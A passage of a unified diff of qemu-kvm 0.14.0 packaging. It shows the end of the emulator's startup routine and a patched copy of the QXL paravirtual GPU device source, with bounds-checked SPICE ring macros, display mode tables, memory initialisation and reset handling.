+        i = select_watchdog(watchdog);
+        if (i > 0)
+            exit (i == 1 ? 1 : 0);
+    }
+
+    if (machine->compat_props) {
+        qdev_prop_register_global_list(machine->compat_props);
+    }
+    qemu_add_globals();
+
+    machine->init(ram_size, boot_devices,
+                  kernel_filename, kernel_cmdline, initrd_filename, cpu_model);
+
+    cpu_synchronize_all_post_init();
+
+    /* must be after terminal init, SDL library changes signal handlers */
+    os_setup_signal_handling();
+
+    set_numa_modes();
+
+    current_machine = machine;
+
+    /* init USB devices */
+    if (usb_enabled) {
+        if (foreach_device_config(DEV_USB, usb_parse) < 0)
+            exit(1);
+    }
+
+    /* init generic devices */
+    if (qemu_opts_foreach(qemu_find_opts("device"), device_init_func, NULL, 1) != 0)
+        exit(1);
+
+    net_check_clients();
+
+    /* just use the first displaystate for the moment */
+    ds = get_displaystate();
+
+    if (using_spice)
+        display_remote++;
+    if (display_type == DT_DEFAULT && !display_remote) {
+#if defined(CONFIG_SDL) || defined(CONFIG_COCOA)
+        display_type = DT_SDL;
+#else
+        vnc_display = "localhost:0,to=99";
+        show_vnc_port = 1;
+#endif
+    }
+        
+
+    /* init local displays */
+    switch (display_type) {
+    case DT_NOGRAPHIC:
+        break;
+#if defined(CONFIG_CURSES)
+    case DT_CURSES:
+        curses_display_init(ds, full_screen);
+        break;
+#endif
+#if defined(CONFIG_SDL)
+    case DT_SDL:
+        sdl_display_init(ds, full_screen, no_frame);
+        break;
+#elif defined(CONFIG_COCOA)
+    case DT_SDL:
+        cocoa_display_init(ds, full_screen);
+        break;
+#endif
+    default:
+        break;
+    }
+
+    /* init remote displays */
+    if (vnc_display) {
+        vnc_display_init(ds);
+        if (vnc_display_open(ds, vnc_display) < 0)
+            exit(1);
+
+        if (show_vnc_port) {
+            printf("VNC server running on `%s'\n", vnc_display_local_addr(ds));
+        }
+    }
+#ifdef CONFIG_SPICE
+    if (using_spice && !qxl_enabled) {
+        qemu_spice_display_init(ds);
+    }
+#endif
+
+    /* display setup */
+    dpy_resize(ds);
+    dcl = ds->listeners;
+    while (dcl != NULL) {
+        if (dcl->dpy_refresh != NULL) {
+            ds->gui_timer = qemu_new_timer(rt_clock, gui_update, ds);
+            qemu_mod_timer(ds->gui_timer, qemu_get_clock(rt_clock));
+            break;
+        }
+        dcl = dcl->next;
+    }
+    if (ds->gui_timer == NULL) {
+        nographic_timer = qemu_new_timer(rt_clock, nographic_update, NULL);
+        qemu_mod_timer(nographic_timer, qemu_get_clock(rt_clock));
+    }
+    text_consoles_set_display(ds);
+
+    if (gdbstub_dev && gdbserver_start(gdbstub_dev) < 0) {
+        fprintf(stderr, "qemu: could not open gdbserver on device '%s'\n",
+                gdbstub_dev);
+        exit(1);
+    }
+
+    qdev_machine_creation_done();
+
+    if (rom_load_all() != 0) {
+        fprintf(stderr, "rom loading failed\n");
+        exit(1);
+    }
+
+    /* TODO: once all bus devices are qdevified, this should be done
+     * when bus is created by qdev.c */
+    qemu_register_reset(qbus_reset_all_fn, sysbus_get_default());
+    qemu_run_machine_init_done_notifiers();
+
+    qemu_system_reset();
+    if (loadvm) {
+        if (load_vmstate(loadvm) < 0) {
+            autostart = 0;
+        }
+    }
+
+    if (incoming) {
+        int ret = qemu_start_incoming_migration(incoming);
+        if (ret < 0) {
+            fprintf(stderr, "Migration failed. Exit code %s(%d), exiting.\n",
+                    incoming, ret);
+            exit(ret);
+        }
+    } else if (autostart) {
+        vm_start();
+    }
+
+    os_setup_post();
+
+    main_loop();
+    quit_timers();
+    net_cleanup();
+
+    return 0;
+}
diff -Nurp qemu-kvm-0.14.0+noroms.orig/.pc/.quilt_patches qemu-kvm-0.14.0+noroms/.pc/.quilt_patches
--- qemu-kvm-0.14.0+noroms.orig/.pc/.quilt_patches	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/.pc/.quilt_patches	2014-02-19 10:12:25.000000000 -0500
@@ -0,0 +1 @@
+debian/patches
diff -Nurp qemu-kvm-0.14.0+noroms.orig/.pc/.quilt_series qemu-kvm-0.14.0+noroms/.pc/.quilt_series
--- qemu-kvm-0.14.0+noroms.orig/.pc/.quilt_series	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/.pc/.quilt_series	2014-02-19 10:12:25.000000000 -0500
@@ -0,0 +1 @@
+series
diff -Nurp qemu-kvm-0.14.0+noroms.orig/.pc/spice-qxl-locking-fix-for-qemu-kvm.patch/hw/qxl.c qemu-kvm-0.14.0+noroms/.pc/spice-qxl-locking-fix-for-qemu-kvm.patch/hw/qxl.c
--- qemu-kvm-0.14.0+noroms.orig/.pc/spice-qxl-locking-fix-for-qemu-kvm.patch/hw/qxl.c	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/.pc/spice-qxl-locking-fix-for-qemu-kvm.patch/hw/qxl.c	2014-02-19 10:12:25.000000000 -0500
@@ -0,0 +1,1531 @@
+/*
+ * Copyright (C) 2010 Red Hat, Inc.
+ *
+ * written by Yaniv Kamay, Izik Eidus, Gerd Hoffmann
+ * maintained by Gerd Hoffmann <kraxel@redhat.com>
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 or
+ * (at your option) version 3 of the License.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, see <http://www.gnu.org/licenses/>.
+ */
+
+#include <pthread.h>
+
+#include "qemu-common.h"
+#include "qemu-timer.h"
+#include "qemu-queue.h"
+#include "monitor.h"
+#include "sysemu.h"
+
+#include "qxl.h"
+
+#undef SPICE_RING_PROD_ITEM
+#define SPICE_RING_PROD_ITEM(r, ret) {                                  \
+        typeof(r) start = r;                                            \
+        typeof(r) end = r + 1;                                          \
+        uint32_t prod = (r)->prod & SPICE_RING_INDEX_MASK(r);           \
+        typeof(&(r)->items[prod]) m_item = &(r)->items[prod];           \
+        if (!((uint8_t*)m_item >= (uint8_t*)(start) && (uint8_t*)(m_item + 1) <= (uint8_t*)(end))) { \
+            abort();                                                    \
+        }                                                               \
+        ret = &m_item->el;                                              \
+    }
+
+#undef SPICE_RING_CONS_ITEM
+#define SPICE_RING_CONS_ITEM(r, ret) {                                  \
+        typeof(r) start = r;                                            \
+        typeof(r) end = r + 1;                                          \
+        uint32_t cons = (r)->cons & SPICE_RING_INDEX_MASK(r);           \
+        typeof(&(r)->items[cons]) m_item = &(r)->items[cons];           \
+        if (!((uint8_t*)m_item >= (uint8_t*)(start) && (uint8_t*)(m_item + 1) <= (uint8_t*)(end))) { \
+            abort();                                                    \
+        }                                                               \
+        ret = &m_item->el;                                              \
+    }
+
+#undef ALIGN
+#define ALIGN(a, b) (((a) + ((b) - 1)) & ~((b) - 1))
+
+#define PIXEL_SIZE 0.2936875 //1280x1024 is 14.8" x 11.9" 
+
+#define QXL_MODE(_x, _y, _b, _o)                  \
+    {   .x_res = _x,                              \
+        .y_res = _y,                              \
+        .bits  = _b,                              \
+        .stride = (_x) * (_b) / 8,                \
+        .x_mili = PIXEL_SIZE * (_x),              \
+        .y_mili = PIXEL_SIZE * (_y),              \
+        .orientation = _o,                        \
+    }
+
+#define QXL_MODE_16_32(x_res, y_res, orientation) \
+    QXL_MODE(x_res, y_res, 16, orientation),      \
+    QXL_MODE(x_res, y_res, 32, orientation)
+
+#define QXL_MODE_EX(x_res, y_res)                 \
+    QXL_MODE_16_32(x_res, y_res, 0),              \
+    QXL_MODE_16_32(y_res, x_res, 1),              \
+    QXL_MODE_16_32(x_res, y_res, 2),              \
+    QXL_MODE_16_32(y_res, x_res, 3)
+
+static QXLMode qxl_modes[] = {
+    QXL_MODE_EX(640, 480),
+    QXL_MODE_EX(800, 480),
+    QXL_MODE_EX(800, 600),
+    QXL_MODE_EX(832, 624),
+    QXL_MODE_EX(960, 640),
+    QXL_MODE_EX(1024, 600),
+    QXL_MODE_EX(1024, 768),
+    QXL_MODE_EX(1152, 864),
+    QXL_MODE_EX(1152, 870),
+    QXL_MODE_EX(1280, 720),
+    QXL_MODE_EX(1280, 760),
+    QXL_MODE_EX(1280, 768),
+    QXL_MODE_EX(1280, 800),
+    QXL_MODE_EX(1280, 960),
+    QXL_MODE_EX(1280, 1024),
+    QXL_MODE_EX(1360, 768),
+    QXL_MODE_EX(1366, 768),
+    QXL_MODE_EX(1400, 1050),
+    QXL_MODE_EX(1440, 900),
+    QXL_MODE_EX(1600, 900),
+    QXL_MODE_EX(1600, 1200),
+    QXL_MODE_EX(1680, 1050),
+    QXL_MODE_EX(1920, 1080),
+#if VGA_RAM_SIZE >= (16 * 1024 * 1024)
+    /* these modes need more than 8 MB video memory */
+    QXL_MODE_EX(1920, 1200),
+    QXL_MODE_EX(1920, 1440),
+    QXL_MODE_EX(2048, 1536),
+    QXL_MODE_EX(2560, 1440),
+    QXL_MODE_EX(2560, 1600),
+#endif
+#if VGA_RAM_SIZE >= (32 * 1024 * 1024)
+    /* these modes need more than 16 MB video memory */
+    QXL_MODE_EX(2560, 2048),
+    QXL_MODE_EX(2800, 2100),
+    QXL_MODE_EX(3200, 2400),
+#endif
+};
+
+static PCIQXLDevice *qxl0;
+
+static void qxl_send_events(PCIQXLDevice *d, uint32_t events);
+static void qxl_destroy_primary(PCIQXLDevice *d);
+static void qxl_reset_memslots(PCIQXLDevice *d);
+static void qxl_reset_surfaces(PCIQXLDevice *d);
+static void qxl_ring_set_dirty(PCIQXLDevice *qxl);
+
+static inline uint32_t msb_mask(uint32_t val)
+{
+    uint32_t mask;
+
+    do {
+        mask = ~(val - 1) & val;
+        val &= ~mask;
+    } while (mask < val);
+
+    return mask;
+}
+
+static ram_addr_t qxl_rom_size(void)
+{
+    uint32_t rom_size = sizeof(QXLRom) + sizeof(QXLModes) + sizeof(qxl_modes);
+    rom_size = MAX(rom_size, TARGET_PAGE_SIZE);
+    rom_size = msb_mask(rom_size * 2 - 1);
+    return rom_size;
+}
+
+static void init_qxl_rom(PCIQXLDevice *d)
+{
+    QXLRom *rom = qemu_get_ram_ptr(d->rom_offset);
+    QXLModes *modes = (QXLModes *)(rom + 1);
+    uint32_t ram_header_size;
+    uint32_t surface0_area_size;
+    uint32_t num_pages;
+    uint32_t fb, maxfb = 0;
+    int i;
+
+    memset(rom, 0, d->rom_size);
+
+    rom->magic         = cpu_to_le32(QXL_ROM_MAGIC);
+    rom->id            = cpu_to_le32(d->id);
+    rom->log_level     = cpu_to_le32(d->guestdebug);
+    rom->modes_offset  = cpu_to_le32(sizeof(QXLRom));
+
+    rom->slot_gen_bits = MEMSLOT_GENERATION_BITS;
+    rom->slot_id_bits  = MEMSLOT_SLOT_BITS;
+    rom->slots_start   = 1;
+    rom->slots_end     = NUM_MEMSLOTS - 1;
+    rom->n_surfaces    = cpu_to_le32(NUM_SURFACES);
+
+    modes->n_modes     = cpu_to_le32(ARRAY_SIZE(qxl_modes));
+    for (i = 0; i < modes->n_modes; i++) {
+        fb = qxl_modes[i].y_res * qxl_modes[i].stride;
+        if (maxfb < fb) {
+            maxfb = fb;
+        }
+        modes->modes[i].id          = cpu_to_le32(i);
+        modes->modes[i].x_res       = cpu_to_le32(qxl_modes[i].x_res);
+        modes->modes[i].y_res       = cpu_to_le32(qxl_modes[i].y_res);
+        modes->modes[i].bits        = cpu_to_le32(qxl_modes[i].bits);
+        modes->modes[i].stride      = cpu_to_le32(qxl_modes[i].stride);
+        modes->modes[i].x_mili      = cpu_to_le32(qxl_modes[i].x_mili);
+        modes->modes[i].y_mili      = cpu_to_le32(qxl_modes[i].y_mili);
+        modes->modes[i].orientation = cpu_to_le32(qxl_modes[i].orientation);
+    }
+    if (maxfb < VGA_RAM_SIZE && d->id == 0)
+        maxfb = VGA_RAM_SIZE;
+
+    ram_header_size    = ALIGN(sizeof(QXLRam), 4096);
+    surface0_area_size = ALIGN(maxfb, 4096);
+    num_pages          = d->vga.vram_size;
+    num_pages         -= ram_header_size;
+    num_pages         -= surface0_area_size;
+    num_pages          = num_pages / TARGET_PAGE_SIZE;
+
+    rom->draw_area_offset   = cpu_to_le32(0);
+    rom->surface0_area_size = cpu_to_le32(surface0_area_size);
+    rom->pages_offset       = cpu_to_le32(surface0_area_size);
+    rom->num_pages          = cpu_to_le32(num_pages);
+    rom->ram_header_offset  = cpu_to_le32(d->vga.vram_size - ram_header_size);
+
+    d->shadow_rom = *rom;
+    d->rom        = rom;
+    d->modes      = modes;
+}
+
+static void init_qxl_ram(PCIQXLDevice *d)
+{
+    uint8_t *buf;
+    uint64_t *item;
+
+    buf = d->vga.vram_ptr;
+    d->ram = (QXLRam *)(buf + le32_to_cpu(d->shadow_rom.ram_header_offset));
+    d->ram->magic       = cpu_to_le32(QXL_RAM_MAGIC);
+    d->ram->int_pending = cpu_to_le32(0);
+    d->ram->int_mask    = cpu_to_le32(0);
+    SPICE_RING_INIT(&d->ram->cmd_ring);
+    SPICE_RING_INIT(&d->ram->cursor_ring);
+    SPICE_RING_INIT(&d->ram->release_ring);
+    SPICE_RING_PROD_ITEM(&d->ram->release_ring, item);
+    *item = 0;
+    qxl_ring_set_dirty(d);
+}
+
+/* can be called from spice server thread context */
+static void qxl_set_dirty(ram_addr_t addr, ram_addr_t end)
+{
+    while (addr < end) {
+        cpu_physical_memory_set_dirty(addr);
+        addr += TARGET_PAGE_SIZE;
+    }
+}
+
+static void qxl_rom_set_dirty(PCIQXLDevice *qxl)
+{
+    ram_addr_t addr = qxl->rom_offset;
+    qxl_set_dirty(addr, addr + qxl->rom_size);
+}
+
+/* called from spice server thread context only */
+static void qxl_ram_set_dirty(PCIQXLDevice *qxl, void *ptr)
+{
+    ram_addr_t addr = qxl->vga.vram_offset;
+    void *base = qxl->vga.vram_ptr;
+    intptr_t offset;
+
+    offset = ptr - base;
+    offset &= ~(TARGET_PAGE_SIZE-1);
+    assert(offset < qxl->vga.vram_size);
+    qxl_set_dirty(addr + offset, addr + offset + TARGET_PAGE_SIZE);
+}
+
+/* can be called from spice server thread context */
+static void qxl_ring_set_dirty(PCIQXLDevice *qxl)
+{
+    ram_addr_t addr = qxl->vga.vram_offset + qxl->shadow_rom.ram_header_offset;
+    ram_addr_t end  = qxl->vga.vram_offset + qxl->vga.vram_size;
+    qxl_set_dirty(addr, end);
+}
+
+/*
+ * keep track of some command state, for savevm/loadvm.
+ * called from spice server thread context only
+ */
+static void qxl_track_command(PCIQXLDevice *qxl, struct QXLCommandExt *ext)
+{
+    switch (le32_to_cpu(ext->cmd.type)) {
+    case QXL_CMD_SURFACE:
+    {
+        QXLSurfaceCmd *cmd = qxl_phys2virt(qxl, ext->cmd.data, ext->group_id);
+        uint32_t id = le32_to_cpu(cmd->surface_id);
+        PANIC_ON(id >= NUM_SURFACES);
+        if (cmd->type == QXL_SURFACE_CMD_CREATE) {
+            qxl->guest_surfaces.cmds[id] = ext->cmd.data;
+            qxl->guest_surfaces.count++;
+            if (qxl->guest_surfaces.max < qxl->guest_surfaces.count)
+                qxl->guest_surfaces.max = qxl->guest_surfaces.count;
+        }
+        if (cmd->type == QXL_SURFACE_CMD_DESTROY) {
+            qxl->guest_surfaces.cmds[id] = 0;
+            qxl->guest_surfaces.count--;
+        }
+        break;
+    }
+    case QXL_CMD_CURSOR:
+    {
+        QXLCursorCmd *cmd = qxl_phys2virt(qxl, ext->cmd.data, ext->group_id);
+        if (cmd->type == QXL_CURSOR_SET) {
+            qxl->guest_cursor = ext->cmd.data;
+        }
+        break;
+    }
+    }
+}
+
+/* spice display interface callbacks */
+
+static void interface_attach_worker(QXLInstance *sin, QXLWorker *qxl_worker)
+{
+    PCIQXLDevice *qxl = container_of(sin, PCIQXLDevice, ssd.qxl);
+
+    dprint(qxl, 1, "%s:\n", __FUNCTION__);
+    qxl->ssd.worker = qxl_worker;
+}
+
+static void interface_set_compression_level(QXLInstance *sin, int level)
+{
+    PCIQXLDevice *qxl = container_of(sin, PCIQXLDevice, ssd.qxl);
+
+    dprint(qxl, 1, "%s: %d\n", __FUNCTION__, level);
+    qxl->shadow_rom.compression_level = cpu_to_le32(level);
+    qxl->rom->compression_level = cpu_to_le32(level);
+    qxl_rom_set_dirty(qxl);
+}
+
+static void interface_set_mm_time(QXLInstance *sin, uint32_t mm_time)
+{
+    PCIQXLDevice *qxl = container_of(sin, PCIQXLDevice, ssd.qxl);
+
+    qxl->shadow_rom.mm_clock = cpu_to_le32(mm_time);
+    qxl->rom->mm_clock = cpu_to_le32(mm_time);
+    qxl_rom_set_dirty(qxl);
+}
+
+static void interface_get_init_info(QXLInstance *sin, QXLDevInitInfo *info)
+{
+    PCIQXLDevice *qxl = container_of(sin, PCIQXLDevice, ssd.qxl);
+
+    dprint(qxl, 1, "%s:\n", __FUNCTION__);
+    info->memslot_gen_bits = MEMSLOT_GENERATION_BITS;
+    info->memslot_id_bits = MEMSLOT_SLOT_BITS;
+    info->num_memslots = NUM_MEMSLOTS;
+    info->num_memslots_groups = NUM_MEMSLOTS_GROUPS;
+    info->internal_groupslot_id = 0;
+    info->qxl_ram_size = le32_to_cpu(qxl->shadow_rom.num_pages) << TARGET_PAGE_BITS;
+    info->n_surfaces = NUM_SURFACES;
+}
+
+/* called from spice server thread context only */
+static int interface_get_command(QXLInstance *sin, struct QXLCommandExt *ext)
+{
+    PCIQXLDevice *qxl = container_of(sin, PCIQXLDevice, ssd.qxl);
+    SimpleSpiceUpdate *update;
+    QXLCommandRing *ring;
+    QXLCommand *cmd;
+    int notify;
+
+    switch (qxl->mode) {
+    case QXL_MODE_VGA:
+        dprint(qxl, 2, "%s: vga\n", __FUNCTION__);
+        update = qemu_spice_create_update(&qxl->ssd);
+        if (update == NULL) {
+            return false;
+        }
+        *ext = update->ext;
+        qxl_log_command(qxl, "vga", ext);
+        return true;
+    case QXL_MODE_COMPAT:
+    case QXL_MODE_NATIVE:
+    case QXL_MODE_UNDEFINED:
+        dprint(qxl, 2, "%s: %s\n", __FUNCTION__,
+               qxl->cmdflags ? "compat" : "native");
+        ring = &qxl->ram->cmd_ring;
+        if (SPICE_RING_IS_EMPTY(ring)) {
+            return false;
+        }
+        SPICE_RING_CONS_ITEM(ring, cmd);
+        ext->cmd      = *cmd;
+        ext->group_id = MEMSLOT_GROUP_GUEST;
+        ext->flags    = qxl->cmdflags;
+        SPICE_RING_POP(ring, notify);
+        qxl_ring_set_dirty(qxl);
+        if (notify) {
+            qxl_send_events(qxl, QXL_INTERRUPT_DISPLAY);
+        }
+        qxl->guest_primary.commands++;
+        qxl_track_command(qxl, ext);
+        qxl_log_command(qxl, "cmd", ext);
+        return true;
+    default:
+        return false;
+    }
+}
+
+/* called from spice server thread context only */
+static int interface_req_cmd_notification(QXLInstance *sin)
+{
+    PCIQXLDevice *qxl = container_of(sin, PCIQXLDevice, ssd.qxl);
+    int wait = 1;
+
+    switch (qxl->mode) {
+    case QXL_MODE_COMPAT:
+    case QXL_MODE_NATIVE:
+    case QXL_MODE_UNDEFINED:
+        SPICE_RING_CONS_WAIT(&qxl->ram->cmd_ring, wait);
+        qxl_ring_set_dirty(qxl);
+        break;
+    default:
+        /* nothing */
+        break;
+    }
+    return wait;
+}
+
+/* called from spice server thread context only */
+static inline void qxl_push_free_res(PCIQXLDevice *d, int flush)
+{
+    QXLReleaseRing *ring = &d->ram->release_ring;
+    uint64_t *item;
+    int notify;
+
+#define QXL_FREE_BUNCH_SIZE 32
+
+    if (ring->prod - ring->cons + 1 == ring->num_items) {
+        /* ring full -- can't push */
+        return;
+    }
+    if (!flush && d->oom_running) {
+        /* collect everything from oom handler before pushing */
+        return;
+    }
+    if (!flush && d->num_free_res < QXL_FREE_BUNCH_SIZE) {
+        /* collect a bit more before pushing */
+        return;
+    }
+
+    SPICE_RING_PUSH(ring, notify);
+    dprint(d, 2, "free: push %d items, notify %s, ring %d/%d [%d,%d]\n",
+           d->num_free_res, notify ? "yes" : "no",
+           ring->prod - ring->cons, ring->num_items,
+           ring->prod, ring->cons);
+    if (notify) {
+        qxl_send_events(d, QXL_INTERRUPT_DISPLAY);
+    }
+    SPICE_RING_PROD_ITEM(ring, item);
+    *item = 0;
+    d->num_free_res = 0;
+    d->last_release = NULL;
+    qxl_ring_set_dirty(d);
+}
+
+/* called from spice server thread context only */
+static void interface_release_resource(QXLInstance *sin,
+                                       struct QXLReleaseInfoExt ext)
+{
+    PCIQXLDevice *qxl = container_of(sin, PCIQXLDevice, ssd.qxl);
+    QXLReleaseRing *ring;
+    uint64_t *item, id;
+
+    if (ext.group_id == MEMSLOT_GROUP_HOST) {
+        /* host group -> vga mode update request */
+        qemu_spice_destroy_update(&qxl->ssd, (void*)ext.info->id);
+        return;
+    }
+
+    /*
+     * ext->info points into guest-visible memory
+     * pci bar 0, $command.release_info
+     */
+    ring = &qxl->ram->release_ring;
+    SPICE_RING_PROD_ITEM(ring, item);
+    if (*item == 0) {
+        /* stick head into the ring */
+        id = ext.info->id;
+        ext.info->next = 0;
+        qxl_ram_set_dirty(qxl, &ext.info->next);
+        *item = id;
+        qxl_ring_set_dirty(qxl);
+    } else {
+        /* append item to the list */
+        qxl->last_release->next = ext.info->id;
+        qxl_ram_set_dirty(qxl, &qxl->last_release->next);
+        ext.info->next = 0;
+        qxl_ram_set_dirty(qxl, &ext.info->next);
+    }
+    qxl->last_release = ext.info;
+    qxl->num_free_res++;
+    dprint(qxl, 3, "%4d\r", qxl->num_free_res);
+    qxl_push_free_res(qxl, 0);
+}
+
+/* called from spice server thread context only */
+static int interface_get_cursor_command(QXLInstance *sin, struct QXLCommandExt *ext)
+{
+    PCIQXLDevice *qxl = container_of(sin, PCIQXLDevice, ssd.qxl);
+    QXLCursorRing *ring;
+    QXLCommand *cmd;
+    int notify;
+
+    switch (qxl->mode) {
+    case QXL_MODE_COMPAT:
+    case QXL_MODE_NATIVE:
+    case QXL_MODE_UNDEFINED:
+        ring = &qxl->ram->cursor_ring;
+        if (SPICE_RING_IS_EMPTY(ring)) {
+            return false;
+        }
+        SPICE_RING_CONS_ITEM(ring, cmd);
+        ext->cmd      = *cmd;
+        ext->group_id = MEMSLOT_GROUP_GUEST;
+        ext->flags    = qxl->cmdflags;
+        SPICE_RING_POP(ring, notify);
+        qxl_ring_set_dirty(qxl);
+        if (notify) {
+            qxl_send_events(qxl, QXL_INTERRUPT_CURSOR);
+        }
+        qxl->guest_primary.commands++;
+        qxl_track_command(qxl, ext);
+        qxl_log_command(qxl, "csr", ext);
+        if (qxl->id == 0) {
+            qxl_render_cursor(qxl, ext);
+        }
+        return true;
+    default:
+        return false;
+    }
+}
+
+/* called from spice server thread context only */
+static int interface_req_cursor_notification(QXLInstance *sin)
+{
+    PCIQXLDevice *qxl = container_of(sin, PCIQXLDevice, ssd.qxl);
+    int wait = 1;
+
+    switch (qxl->mode) {
+    case QXL_MODE_COMPAT:
+    case QXL_MODE_NATIVE:
+    case QXL_MODE_UNDEFINED:
+        SPICE_RING_CONS_WAIT(&qxl->ram->cursor_ring, wait);
+        qxl_ring_set_dirty(qxl);
+        break;
+    default:
+        /* nothing */
+        break;
+    }
+    return wait;
+}
+
+/* called from spice server thread context */
+static void interface_notify_update(QXLInstance *sin, uint32_t update_id)
+{
+    fprintf(stderr, "%s: abort()\n", __FUNCTION__);
+    abort();
+}
+
+/* called from spice server thread context only */
+static int interface_flush_resources(QXLInstance *sin)
+{
+    PCIQXLDevice *qxl = container_of(sin, PCIQXLDevice, ssd.qxl);
+    int ret;
+
+    dprint(qxl, 1, "free: guest flush (have %d)\n", qxl->num_free_res);
+    ret = qxl->num_free_res;
+    if (ret) {
+        qxl_push_free_res(qxl, 1);
+    }
+    return ret;
+}
+
+static const QXLInterface qxl_interface = {
+    .base.type               = SPICE_INTERFACE_QXL,
+    .base.description        = "qxl gpu",
+    .base.major_version      = SPICE_INTERFACE_QXL_MAJOR,
+    .base.minor_version      = SPICE_INTERFACE_QXL_MINOR,
+
+    .attache_worker          = interface_attach_worker,
+    .set_compression_level   = interface_set_compression_level,
+    .set_mm_time             = interface_set_mm_time,
+    .get_init_info           = interface_get_init_info,
+
+    /* the callbacks below are called from spice server thread context */
+    .get_command             = interface_get_command,
+    .req_cmd_notification    = interface_req_cmd_notification,
+    .release_resource        = interface_release_resource,
+    .get_cursor_command      = interface_get_cursor_command,
+    .req_cursor_notification = interface_req_cursor_notification,
+    .notify_update           = interface_notify_update,
+    .flush_resources         = interface_flush_resources,
+};
+
+static void qxl_enter_vga_mode(PCIQXLDevice *d)
+{
+    if (d->mode == QXL_MODE_VGA) {
+        return;
+    }
+    dprint(d, 1, "%s\n", __FUNCTION__);
+    qemu_spice_create_host_primary(&d->ssd);
+    d->mode = QXL_MODE_VGA;
+    memset(&d->ssd.dirty, 0, sizeof(d->ssd.dirty));
+}
+
+static void qxl_exit_vga_mode(PCIQXLDevice *d)
+{
+    if (d->mode != QXL_MODE_VGA) {
+        return;
+    }
+    dprint(d, 1, "%s\n", __FUNCTION__);
+    qxl_destroy_primary(d);
+}
+
+static void qxl_set_irq(PCIQXLDevice *d)
+{
+    uint32_t pending = le32_to_cpu(d->ram->int_pending);
+    uint32_t mask    = le32_to_cpu(d->ram->int_mask);
+    int level = !!(pending & mask);
+    qemu_set_irq(d->pci.irq[0], level);
+    qxl_ring_set_dirty(d);
+}
+
+static void qxl_write_config(PCIDevice *d, uint32_t address,
+                             uint32_t val, int len)
+{
+    PCIQXLDevice *qxl = DO_UPCAST(PCIQXLDevice, pci, d);
+    VGACommonState *vga = &qxl->vga;
+
+    vga_dirty_log_stop(vga);
+    pci_default_write_config(d, address, val, len);
+    if (vga->map_addr && qxl->pci.io_regions[0].addr == -1) {
+        vga->map_addr = 0;
+    }
+    vga_dirty_log_start(vga);
+}
+
+static void qxl_check_state(PCIQXLDevice *d)
+{
+    QXLRam *ram = d->ram;
+
+    assert(SPICE_RING_IS_EMPTY(&ram->cmd_ring));
+    assert(SPICE_RING_IS_EMPTY(&ram->cursor_ring));
+}
+
+static void qxl_reset_state(PCIQXLDevice *d)
+{
+    QXLRam *ram = d->ram;
+    QXLRom *rom = d->rom;
+
+    assert(SPICE_RING_IS_EMPTY(&ram->cmd_ring));
+    assert(SPICE_RING_IS_EMPTY(&ram->cursor_ring));
+    d->shadow_rom.update_id = cpu_to_le32(0);
+    *rom = d->shadow_rom;
+    qxl_rom_set_dirty(d);
+    init_qxl_ram(d);
+    d->num_free_res = 0;
+    d->last_release = NULL;
+    memset(&d->ssd.dirty, 0, sizeof(d->ssd.dirty));
+}
+
+static void qxl_soft_reset(PCIQXLDevice *d)
+{
+    dprint(d, 1, "%s:\n", __FUNCTION__);
+    qxl_check_state(d);
+
+    if (d->id == 0) {
+        qxl_enter_vga_mode(d);
+    } else {
+        d->mode = QXL_MODE_UNDEFINED;
+    }
+}
+
+static void qxl_hard_reset(PCIQXLDevice *d, int loadvm)
+{
+    dprint(d, 1, "%s: start%s\n", __FUNCTION__,
+           loadvm ? " (loadvm)" : "");
+
+    qemu_mutex_unlock_iothread();
+    d->ssd.worker->reset_cursor(d->ssd.worker);
+    d->ssd.worker->reset_image_cache(d->ssd.worker);
+    qemu_mutex_lock_iothread();
+    qxl_reset_surfaces(d);
+    qxl_reset_memslots(d);
+
+    /* pre loadvm reset must not touch QXLRam.  This lives in
+     * device memory, is migrated together with RAM and thus
+     * already loaded at this point */
+    if (!loadvm) {
+        qxl_reset_state(d);
+    }
+    qemu_spice_create_host_memslot(&d->ssd);
+    qxl_soft_reset(d);
+
+    dprint(d, 1, "%s: done\n", __FUNCTION__);
+}
+
+static void qxl_reset_handler(DeviceState *dev)
+{
+    PCIQXLDevice *d = DO_UPCAST(PCIQXLDevice, pci.qdev, dev);
+    qxl_hard_reset(d, 0);
+}
+
+static void qxl_vga_ioport_write(void *opaque, uint32_t addr, uint32_t val)
+{
+    VGACommonState *vga = opaque;
+    PCIQXLDevice *qxl = container_of(vga, PCIQXLDevice, vga);
+
+    if (qxl->mode != QXL_MODE_VGA) {
+        dprint(qxl, 1, "%s\n", __FUNCTION__);
+        qxl_destroy_primary(qxl);
+        qxl_soft_reset(qxl);
+    }
+    vga_ioport_write(opaque, addr, val);
+}
+
+static void qxl_add_memslot(PCIQXLDevice *d, uint32_t slot_id, uint64_t delta)
+{
+    static const int regions[] = {
+        QXL_RAM_RANGE_INDEX,
+        QXL_VRAM_RANGE_INDEX,
+    };
+    uint64_t guest_start;
+    uint64_t guest_end;
+    int pci_region;
+    pcibus_t pci_start;
+    pcibus_t pci_end;
+    intptr_t virt_start;
+    QXLDevMemSlot memslot;
+    int i;
+
+    guest_start = le64_to_cpu(d->guest_slots[slot_id].slot.mem_start);
+    guest_end   = le64_to_cpu(d->guest_slots[slot_id].slot.mem_end);
+
+    dprint(d, 1, "%s: slot %d: guest phys 0x%" PRIx64 " - 0x%" PRIx64 "\n",
+           __FUNCTION__, slot_id,
+           guest_start, guest_end);
+
+    PANIC_ON(slot_id >= NUM_MEMSLOTS);
+    PANIC_ON(guest_start > guest_end);
+
+    for (i = 0; i < ARRAY_SIZE(regions); i++) {
+        pci_region = regions[i];
+        pci_start = d->pci.io_regions[pci_region].addr;
+        pci_end = pci_start + d->pci.io_regions[pci_region].size;
+        /* mapped? */
+        if (pci_start == -1) {
+            continue;
+        }
+        /* start address in range ? */
+        if (guest_start < pci_start || guest_start > pci_end) {
+            continue;
+        }
+        /* end address in range ? */
+        if (guest_end > pci_end) {
+            continue;
+        }
+        /* passed */
+        break;
+    }
+    PANIC_ON(i == ARRAY_SIZE(regions)); /* finished loop without match */
+
+    switch (pci_region) {
